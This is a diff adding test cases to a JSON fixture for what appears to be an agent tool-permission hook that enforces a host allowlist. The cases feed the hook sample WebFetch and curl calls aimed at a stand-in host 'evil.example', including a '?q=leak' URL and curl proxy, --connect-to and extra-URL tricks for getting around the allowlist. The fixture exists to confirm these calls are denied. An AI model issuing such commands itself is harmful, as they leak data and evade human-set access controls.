@@ -516,5 +516,9 @@
   {"name":"deny_webfetch_unlisted","reason":"is not in qa.hosts.allowed","dir":"{{DECOY}}","event":{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example.net/x?q=leak","prompt":"x"}}},
   {"name":"deny_webfetch_unlisted_with_list","reason":"is not in qa.hosts.allowed","event":{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example.net/x?q=leak","prompt":"x"}}},
   {"name":"deny_url_tool_unlisted_empty_list","reason":"is not in qa.hosts.allowed","dir":"{{DECOY}}","event":{"tool_name":"mcp__Firecrawl__firecrawl_scrape","tool_input":{"url":"https://docs.example.org/page"}}},
-  {"name":"allow_webfetch_listed","event":{"tool_name":"WebFetch","tool_input":{"url":"http://localhost:3000/page","prompt":"x"}}}
+  {"name":"allow_webfetch_listed","event":{"tool_name":"WebFetch","tool_input":{"url":"http://localhost:3000/page","prompt":"x"}}},
+  {"name":"deny_curl_connect_to","reason":"curl --connect-to","event":{"tool_name":"Bash","tool_input":{"command":"curl --connect-to localhost:3000:evil.example:80 http://localhost:3000/"}}},
+  {"name":"deny_curl_schemeless_second_url","reason":"is not a literal http(s) URL","event":{"tool_name":"Bash","tool_input":{"command":"curl http://localhost:3000/ evil.example/x"}}},
+  {"name":"deny_curl_proxy_short","reason":"curl -x","event":{"tool_name":"Bash","tool_input":{"command":"curl -x evil.example:8080 http://localhost:3000/"}}},
+  {"name":"allow_curl_listed_host","event":{"tool_name":"Bash","tool_input":{"command":"curl -s http://localhost:3000/health"}}}
 ]
